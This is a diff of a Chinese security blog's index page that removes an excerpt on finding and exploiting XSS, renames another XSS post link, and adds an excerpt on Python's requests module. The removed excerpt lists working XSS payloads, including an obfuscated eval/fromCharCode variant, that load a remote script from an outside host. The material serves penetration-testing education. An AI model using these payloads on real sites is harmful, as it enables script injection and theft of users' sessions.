@@ -135,71 +135,7 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/xss-use-and-defense/">XSS漏洞挖掘与利用</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-15</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 XSS的检测 检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
-手工检测：检测结果准确，但对于大型web来说费时费力
-软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
-检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
- 手工检测
-可得知输出位置: • 输入敏感字符，如&lt;、&gt;、&quot;、'、()等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&quot;&amp;'()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&lt;div&gt;XSS Test&lt;/div&gt; 在属性内：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;XSS Test&quot; /&gt; 这种情况通常采用输入&quot;/&gt;XSS Test来测试。  全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
-专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
-一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
-  0x01 XSS的挖掘与利用  XSS漏洞挖掘
-反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
-• &lt;script src='http://b.ioio.pub/xss/probe.js'&gt;&lt;/script&gt; • &lt;img src=x onerror=&quot;s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'&quot;;&gt; • &lt;svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js&gt; • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &gt;   0x03 XSS简单示例 反射型xss简单示例: • &lt;?
-    </p>
-
-    
-    <footer>
-        <a href="/posts/xss-use-and-defense/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/xss-basis/">XSS初识</a></h2>
+        <h2><a href="http://wyb0.com/posts/xss-basis-and-use/">XSS漏洞及其挖掘方法</a></h2>
 
         
         <div class="post-meta">
@@ -250,7 +186,7 @@
 
     
     <footer>
-        <a href="/posts/xss-basis/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+        <a href="/posts/xss-basis-and-use/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
     </footer>
     
 </article>
@@ -637,6 +573,62 @@ DMZ区网段为：172.16.1.0/24 0x03 iptables的策略 新建iptables.sh,内容�
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/python-module-requests/">Python的requests模块</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-02</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/module">module</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 无参数的get请求 import requests resp = requests.get('http://www.baidu.com',timeout=1) #设置超时，超时后抛出timeout错误 print resp.text #一般用来输出纯文本，可得到unicode类型字符串 print resp.content #一般用来输出pdf、图片等，可得到原网页设定类型的字符串  0x01 有参数的get请求 import requests url = 'http://10.10.10.10:8080/Lab2.0/Login.action' header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', } param = {'aaa':'1111','bbb':'2222'} resp = requests.get(url,params=param,headers=header) print resp.url #得到url print resp.status_code #得到返回的状态码 print resp.headers #得到html头 print resp.cookies #得到cookie  0x02 POST请求 import requests url1 = 'http://10.10.10.10:8080/Lab2.0/Login.action' url2 = 'http://10.10.10.10:8080/Lab2.0/student.action' data = { 'userid':'1315935xxx', 'password':'xxxxxxx', 'quan':'Student', } header = { 'User-Agent': 'Mozilla/5.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/python-module-requests/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
 
             
 
@@ -693,7 +685,7 @@ DMZ区网段为：172.16.1.0/24 0x03 iptables的策略 新建iptables.sh,内容�
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(76)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(75)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -905,7 +897,7 @@ DMZ区网段为：172.16.1.0/24 0x03 iptables的策略 新建iptables.sh,内容�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
-                <sup>5</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
